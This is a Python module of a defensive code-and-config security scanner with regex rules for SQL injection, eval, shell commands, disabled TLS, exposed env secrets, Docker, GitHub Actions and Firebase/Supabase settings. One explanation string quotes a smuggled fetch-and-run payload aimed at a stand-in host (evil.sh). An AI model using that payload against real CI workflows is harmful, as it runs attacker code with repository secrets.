"""Checks of the project's own code and config: risky code patterns, secrets sent to the browser through public env variables,
Dockerfiles, GitHub Actions workflows, Firebase rules and Supabase tables without Row Level Security. Pattern rules, so each
finding says 'look at this line', not 'this is exploitable'."""
from __future__ import annotations

import re
from pathlib import Path

from launchcheck.findings import Finding

PY, JS = {".py"}, {".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".vue", ".svelte"}
TEST_PATH = re.compile(r"(^|/)(tests?|__tests__|spec|fixtures?|examples?)/|\.(test|spec)\.[jt]sx?$|(^|/)test_[^/]*\.py$")
PUBLIC_OK = re.compile(r"ANON|PUBLISHABLE|PUBLIC_KEY|FIREBASE|MAPS|MAPBOX|SITE_KEY|RECAPTCHA|MEASUREMENT|POSTHOG|SENTRY_DSN|_URL$|GA_", re.I)

# (id, title, severity, file types, regex, why, fix)
RULES = [
    ("code-sql-string", "SQL built from strings", "medium", PY | JS,
     re.compile(r"""(?:execute|query|raw)\s*\(\s*(?:f("{3}|'{3}|"|')(?:(?!\1).){0,600}?\b(?:SELECT|INSERT|UPDATE|DELETE|WHERE)\b(?:(?!\1).){0,600}?\{|["'][^"'\n]*\b(?:SELECT|INSERT|UPDATE|DELETE)\b[^"'\n]*["']\s*(?:%|\+|\.format)|`[^`]*\b(?:SELECT|INSERT|UPDATE|DELETE)\b[^`]*\$\{)""", re.I | re.S),
     "Putting user input straight into SQL lets an attacker rewrite the query (SQL injection) and read or delete your data.",
     "Use parameters: cursor.execute('SELECT * FROM t WHERE id = %s', (id,)) / db.query('... WHERE id = $1', [id]), or your ORM."),
    ("code-eval", "eval() or new Function() on dynamic input", "medium", PY | JS,
     re.compile(r"""(?<![\w.])(?:eval|exec)\s*\((?!\s*["'`][^"'`]*["'`]\s*\))|new\s+Function\s*\("""),
     "eval runs text as code; if any of that text comes from a user, they can run anything on your server or in the browser.",
     "Replace eval with a parser (json.loads / JSON.parse) or explicit logic."),
    ("code-shell", "Shell command built with shell=True or exec()", "medium", PY | JS,
     re.compile(r"""shell\s*=\s*True|os\.system\s*\(|child_process[^\n]{0,40}\bexec(?:Sync)?\s*\(|\bexecSync\s*\(\s*`[^`]*\$\{"""),
     "A shell command with user input in it lets an attacker add their own commands (command injection).",
     "Pass arguments as a list (subprocess.run(['cmd', arg])) / use execFile with an argument array, never a shell string."),
    ("code-unsafe-load", "Unsafe deserialisation (pickle / yaml.load)", "medium", PY,
     re.compile(r"""pickle\.loads?\s*\(|yaml\.load\s*\((?![^)]*SafeLoader)|marshal\.loads\s*\("""),
     "Loading pickle or full YAML from untrusted data runs code hidden inside it.",
     "Use json, or yaml.safe_load; never unpickle data a user can influence."),
    ("code-tls-off", "Certificate checks turned off", "medium", PY | JS,
     re.compile(r"""verify\s*=\s*False|rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED[^\n]{0,10}["']?0|InsecureSkipVerify\s*:\s*true|CERT_NONE"""),
     "With verification off, anyone on the network path can impersonate the server you are calling and read the traffic.",
     "Remove it. If a test server needs it, use a proper certificate or pin your own CA instead."),
    ("code-debug-on", "Debug mode left on", "low", PY | JS,
     re.compile(r"""\bDEBUG\s*=\s*True\b|\.run\([^)]*debug\s*=\s*True|app\.debug\s*=\s*True"""),
     "Debug pages show stack traces, settings and sometimes an interactive console to anyone who triggers an error.",
     "Read debug from an environment variable that is off in production."),
    ("code-html-injection", "HTML inserted without escaping", "low", JS,
     re.compile(r"""dangerouslySetInnerHTML|\.innerHTML\s*=(?!\s*["'`]\s*["'`])|\bv-html\s*=|\{@html\s"""),
     "If any part of that HTML comes from users, they can inject scripts (cross-site scripting).",
     "Insert text with textContent / normal JSX, or clean the HTML with DOMPurify first."),
    ("code-jwt-secret", "Hard-coded JWT secret", "medium", PY | JS,
     re.compile(r"""jwt\.(?:sign|encode)\s*\([^)\n]*,\s*["'][^"'\n]{4,}["']"""),
     "Anyone who reads the code can sign their own login tokens and become any user.",
     "Load the signing secret from an environment variable and rotate it."),
    ("code-cors-any", "CORS opened to every origin in code", "low", PY | JS,
     re.compile(r"""allow_origins\s*=\s*\[\s*["']\*["']|origin\s*:\s*(?:["']\*["']|true)\b|Access-Control-Allow-Origin["']\s*,\s*["']\*"""),
     "Any website can call this API from a visitor's browser.", "List your own front-end origins instead of *."),
    ("ai-browser-key", "AI provider used from the browser", "high", JS,
     re.compile(r"""dangerouslyAllowBrowser\s*:\s*true|anthropic-dangerous-direct-browser-access"""),
     "The API key ships to every visitor's browser, where anyone can copy it and spend your credit.",
     "Move the AI call to a server route that keeps the key and rate-limits each user."),
]
PUBLIC_ENV = re.compile(r"\b((?:NEXT_PUBLIC|VITE|REACT_APP|EXPO_PUBLIC|PUBLIC|NUXT_PUBLIC)_[A-Z0-9_]*(?:SECRET|PRIVATE|API_KEY|TOKEN|PASSWORD|SERVICE_ROLE|OPENAI|ANTHROPIC|STRIPE_SECRET)[A-Z0-9_]*)\b")


SAFE_PART = re.compile(r"\s*(?:esc|escape|escapeHtml|sanitize|DOMPurify\.sanitize|encodeURIComponent)\s*\(|\s*[A-Z][A-Z0-9_]*\s*$|\s*\d+\s*$")


def _safe_template(text: str, pos: int) -> bool:
    """innerHTML = `...` where every ${...} is escaped, a CONSTANT or a number: nothing a user typed gets in."""
    m = re.match(r"\s*`([^`]{0,4000})`", text[pos:])
    if not m:                                      # a plain quoted string with nothing joined on is safe too
        return bool(re.match(r"""\s*(['"])(?:\\.|(?!\1)[^\n])*\1\s*(?:;|\n|$)""", text[pos:]))
    parts = re.findall(r"\$\{([^}]*)\}", m.group(1))
    return all(SAFE_PART.match(x) for x in parts)


SQL_SAFE = re.compile(r"""^\s*(?:ph|placeholders?|marks|qmarks|[\w\s'",.()]*(?<![A-Za-z0-9])_?[A-Z][A-Z0-9_]+(?![a-z0-9])[\w\s'",.()]*)\s*$""")


def _safe_sql(snippet: str) -> bool:
    """f-string SQL whose {} parts are only placeholders (ph) or CONSTANTS (column lists): values still go in as parameters."""
    m = re.search(r"""\bf("{3}|'{3}|"|')(.*?)\1""", snippet, re.S)
    parts = re.findall(r"\{([^{}]*)\}", m.group(2)) if m else []
    return bool(parts) and all(SQL_SAFE.match(x) for x in parts)


def _line(text: str, pos: int) -> int:
    return text.count("\n", 0, pos) + 1


def check_code(repo: Path, files) -> list[Finding]:
    out, per_rule = [], {}
    public_env: dict[str, str] = {}
    for p in files:
        rel = str(p.relative_to(repo)).replace("\\", "/")
        ext = p.suffix.lower()
        try:
            text = p.read_text("utf-8", errors="replace")
        except OSError:
            continue
        if ext in PY | JS and not TEST_PATH.search(rel):
            for rid, title, sev, exts, rx, why, fix in RULES:
                if ext not in exts or per_rule.get(rid, 0) >= 5:
                    continue
                for m in rx.finditer(text):
                    if rid == "code-html-injection" and _safe_template(text, m.end()):
                        continue
                    if rid == "code-sql-string" and _safe_sql(text[m.start():m.start() + 1500]):
                        continue
                    per_rule[rid] = per_rule.get(rid, 0) + 1
                    out.append(Finding(rid, title, sev, why, fix, f"{rel}:{_line(text, m.start())}", m.group(0)[:80], ["code"]))
                    if per_rule[rid] >= 5:
                        break
        if ext in JS | {".env", ""} or p.name.startswith(".env"):
            for m in PUBLIC_ENV.finditer(text):
                if not PUBLIC_OK.search(m.group(1)):
                    public_env.setdefault(m.group(1), f"{rel}:{_line(text, m.start())}")
    for name, where in list(public_env.items())[:5]:
        out.append(Finding("public-env-secret", f"Secret-looking value in a public env variable: {name}", "high",
                           "Variables starting with NEXT_PUBLIC_, VITE_, REACT_APP_ (and similar) are copied into the browser bundle, "
                           "so every visitor can read them.",
                           f"Rename it without the public prefix, use it only in server code, and rotate the value if it was deployed.",
                           where, name, ["code"]))
    return out


def check_config(repo: Path) -> list[Finding]:
    out = []
    rel = lambda p: str(p.relative_to(repo)).replace("\\", "/")
    for df in [*repo.glob("Dockerfile*"), *repo.glob("*/Dockerfile*")]:
        t = df.read_text("utf-8", "replace")
        users = re.findall(r"^\s*USER\s+(\S+)", t, re.M | re.I)
        if not users or users[-1] in ("root", "0"):
            out.append(Finding("docker-root", "Container runs as root", "low",
                               "If the app is broken into, the attacker is root inside the container, which makes escaping it easier.",
                               "Add a non-root user near the end: RUN useradd -m app && USER app (node images: USER node).", rel(df)))
        for img in re.findall(r"^\s*FROM\s+(\S+)", t, re.M | re.I):
            if img.lower() != "scratch" and "$" not in img and "@sha256" not in img and (":" not in img.split("/")[-1] or img.endswith(":latest")):
                out.append(Finding("docker-latest", f"Base image not pinned: {img}", "low",
                                   "':latest' changes under you, so a rebuild can silently pull a different (or compromised) image.",
                                   "Pin a version tag (node:20.11-alpine) or a digest (@sha256:...).", rel(df), img))
    for wf in [*repo.glob(".github/workflows/*.yml"), *repo.glob(".github/workflows/*.yaml")]:
        t = wf.read_text("utf-8", "replace")
        if "pull_request_target" in t and re.search(r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head", t):
            out.append(Finding("gha-prt-checkout", "Workflow runs pull-request code with repository secrets", "high",
                               "pull_request_target plus checking out the PR's code lets anyone who opens a pull request run code "
                               "with your secrets and write access.",
                               "Use the pull_request trigger for building PR code, or never check out the PR head in a pull_request_target job.",
                               rel(wf)))
        for m in re.finditer(r"run:[^\n]*(?:\n\s+[^\n]*){0,10}?\$\{\{\s*github\.event\.(?:issue|pull_request|comment|review|head_commit)[\w.]*\.(?:title|body|message|head_ref|label)", t):
            out.append(Finding("gha-script-injection", "Workflow puts issue or PR text straight into a shell command", "high",
                               "A title or comment like `\"; curl evil.sh | sh` then runs inside your CI with its secrets.",
                               "Pass the value through an env variable (env: TITLE: ${{ github.event.issue.title }}) and use \"$TITLE\" in the script.",
                               f"{rel(wf)}:{_line(t, m.start())}"))
            break
        if re.search(r"^\s*permissions:\s*write-all", t, re.M):
            out.append(Finding("gha-write-all", "Workflow token has write access to everything", "medium",
                               "If any step is compromised it can push code, change releases and edit settings.",
                               "Set permissions: contents: read at the top and grant more per job only where needed.", rel(wf)))
        for m in re.finditer(r"uses:\s*([\w.-]+/[\w./-]+)@([\w.-]+)", t):
            owner, ref = m.group(1).split("/")[0], m.group(2)
            if owner not in ("actions", "github") and not re.fullmatch(r"[0-9a-f]{40}", ref):
                out.append(Finding("gha-unpinned", f"Third-party action not pinned to a commit: {m.group(1)}@{ref}", "low",
                                   "A tag can be moved to malicious code (this happened to tj-actions/changed-files in 2025) and your "
                                   "workflow runs it with your secrets.",
                                   "Pin to the full commit SHA: uses: owner/action@<40-character sha> # v1.2.3", rel(wf), m.group(0)))
    for rules in [*repo.glob("**/firestore.rules"), *repo.glob("**/storage.rules")]:
        if any(x in rules.parts for x in ("node_modules", ".git")):
            continue
        t = rules.read_text("utf-8", "replace")
        if re.search(r"allow\s+[\w\s,]*(?:read|write)[\w\s,]*:\s*if\s+true\s*;", t):
            out.append(Finding("firebase-open-rules", "Firebase rules let anyone read or write", "high",
                               "'allow ...: if true' means anyone on the internet can read, change or delete this data.",
                               "Require sign-in and ownership, e.g. allow read, write: if request.auth != null && request.auth.uid == userId;",
                               rel(rules)))
    for db in repo.glob("**/database.rules.json"):
        if re.search(r'"\.(?:read|write)"\s*:\s*(?:true|"true")', db.read_text("utf-8", "replace")):
            out.append(Finding("firebase-open-rules", "Firebase Realtime Database open to everyone", "high",
                               "'.read'/'.write': true lets anyone on the internet read or overwrite the database.",
                               "Require auth in the rules: \".read\": \"auth != null\" and narrower rules per path.", rel(db)))
    sql = "\n".join(f.read_text("utf-8", "replace") for f in repo.glob("supabase/migrations/*.sql"))
    if sql:
        created = {m.lower().split(".")[-1].strip('"') for m in re.findall(r"create\s+table\s+(?:if\s+not\s+exists\s+)?([\w.\"]+)", sql, re.I)}
        rls = {m.lower().split(".")[-1].strip('"') for m in re.findall(r"alter\s+table\s+(?:only\s+)?([\w.\"]+)\s+enable\s+row\s+level\s+security", sql, re.I)}
        for t in sorted(created - rls)[:10]:
            out.append(Finding("supabase-no-rls", f"Supabase table '{t}' has no Row Level Security", "high",
                               "With RLS off, the public anon key in your website can read and change every row of this table.",
                               f"alter table {t} enable row level security; then add policies for what each user may do.",
                               "supabase/migrations", t))
    return out
